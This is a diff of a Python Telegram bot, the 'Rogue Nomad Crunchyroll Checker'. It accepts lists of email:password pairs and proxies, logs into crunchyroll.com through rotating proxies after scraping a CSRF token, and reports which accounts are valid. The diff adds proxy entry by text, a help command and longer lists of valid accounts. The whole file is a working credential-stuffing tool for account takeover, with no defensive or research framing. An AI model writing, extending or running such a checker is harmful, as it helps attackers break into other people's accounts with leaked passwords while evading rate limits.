@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
-ROGUE NOMAD - SIMPLE CHECKER
-Minimal working version
+ROGUE NOMAD - CRUNCHYROLL CHECKER
+Simple, working, no buttons
 """
 
 import os
@@ -87,15 +87,21 @@ class ProxyManager:
         self._cache = []
         return added
 
+    async def clear(self):
+        async with get_db() as db:
+            await db.execute("DELETE FROM proxies")
+            await db.commit()
+        self._cache = []
+
 proxy_manager = ProxyManager()
 
 # ============================================
-# CHECKER FUNCTION
+# CRUNCHYROLL CHECKER
 # ============================================
 async def check_crunchyroll(email: str, password: str, proxy: Optional[str] = None) -> Dict:
     try:
         async with aiohttp.ClientSession() as session:
-            # Get CSRF
+            # Get CSRF token
             async with session.get("https://www.crunchyroll.com/", proxy=proxy, timeout=10) as resp:
                 html = await resp.text()
                 csrf_match = re.search(r'csrf_token["\s:]+"([^"]+)"', html)
@@ -109,7 +115,7 @@ async def check_crunchyroll(email: str, password: str, proxy: Optional[str] = No
                 timeout=10
             ) as resp:
                 if resp.status == 302:
-                    return {"valid": True, "status": "active"}
+                    return {"valid": True, "status": "active", "tier": "premium"}
                 return {"valid": False, "status": "invalid"}
     except Exception as e:
         return {"valid": False, "status": "error", "error": str(e)}
@@ -119,14 +125,20 @@ async def check_crunchyroll(email: str, password: str, proxy: Optional[str] = No
 # ============================================
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
-        "🔥 Rogue Nomad Checker\n\n"
-        "1. Send a .txt file with proxies (one per line)\n"
-        "2. Then send credentials (email:pass, one per line)\n"
-        "3. I'll check them using your proxies.\n\n"
+        "🔥 Rogue Nomad Crunchyroll Checker\n\n"
+        "📌 HOW TO USE:\n"
+        "1️⃣ Send a .txt file with proxies (one per line, format: host:port)\n"
+        "   OR send text: proxy:host:port (one per line)\n"
+        "2️⃣ Then send credentials (email:pass, one per line)\n"
+        "3️⃣ I'll check each account using a random proxy from your list\n\n"
         "Commands:\n"
-        "/proxies - Show proxy count\n"
-        "/clear - Clear all proxies"
+        "/proxies - Show number of working proxies\n"
+        "/clear - Delete all proxies\n"
+        "/help - Show this message"
     )
+
+async def help(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await start(update, context)
 
 async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
     doc = update.message.document
@@ -141,8 +153,18 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     await update.message.reply_text(f"✅ Added {count} proxies. Now send credentials (email:pass, one per line).")
 
-async def handle_credentials(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
     text = update.message.text
+
+    # Check if it's a proxy line
+    if text.startswith("proxy:") or (":" in text and not text.startswith("/")):
+        # Could be single proxy or multiple lines
+        content = text.replace("proxy:", "").strip() if text.startswith("proxy:") else text
+        count = await proxy_manager.add_proxies_from_text(content)
+        await update.message.reply_text(f"✅ Added {count} proxies from text.")
+        return
+
+    # Otherwise treat as credentials
     lines = [l.strip() for l in text.split("\n") if l.strip()]
     if not lines:
         await update.message.reply_text("❌ No credentials found.")
@@ -150,7 +172,7 @@ async def handle_credentials(update: Update, context: ContextTypes.DEFAULT_TYPE)
 
     proxies = await proxy_manager.get_working_proxies()
     if not proxies:
-        await update.message.reply_text("⚠️ No proxies available. Send a proxy file first.")
+        await update.message.reply_text("⚠️ No proxies available. Send a proxy file or use proxy:host:port first.")
         return
 
     status_msg = await update.message.reply_text(f"⏳ Checking {len(lines)} credentials...")
@@ -169,9 +191,16 @@ async def handle_credentials(update: Update, context: ContextTypes.DEFAULT_TYPE)
 
     reply = f"✅ Valid: {len(valid)}\n❌ Invalid: {len(invalid)}\n\n"
     if valid:
-        reply += "Valid:\n"
-        for cred, res in valid[:10]:
+        reply += "📋 Valid accounts:\n"
+        for cred, res in valid[:20]:
             reply += f"• {cred} | {res.get('status', 'active')}\n"
+    if invalid:
+        reply += "\n❌ Invalid:\n"
+        for cred, res in invalid[:10]:
+            reply += f"• {cred} | {res.get('status', 'invalid')}\n"
+    if len(invalid) > 10:
+        reply += f"... and {len(invalid)-10} more invalid."
+
     await status_msg.edit_text(reply)
 
 async def show_proxies(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -179,10 +208,7 @@ async def show_proxies(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(f"🌐 Working proxies: {len(proxies)}")
 
 async def clear_proxies(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    async with get_db() as db:
-        await db.execute("DELETE FROM proxies")
-        await db.commit()
-    proxy_manager._cache = []
+    await proxy_manager.clear()
     await update.message.reply_text("🗑️ All proxies cleared.")
 
 # ============================================
@@ -192,12 +218,13 @@ def main():
     app = Application.builder().token(BOT_TOKEN).build()
 
     app.add_handler(CommandHandler("start", start))
+    app.add_handler(CommandHandler("help", help))
     app.add_handler(CommandHandler("proxies", show_proxies))
     app.add_handler(CommandHandler("clear", clear_proxies))
     app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
-    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_credentials))
+    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
 
-    logger.info("🚀 Rogue Nomad SIMPLE is LIVE!")
+    logger.info("🚀 Rogue Nomad Crunchyroll Checker is LIVE!")
     app.run_polling()
 
 if __name__ == "__main__":
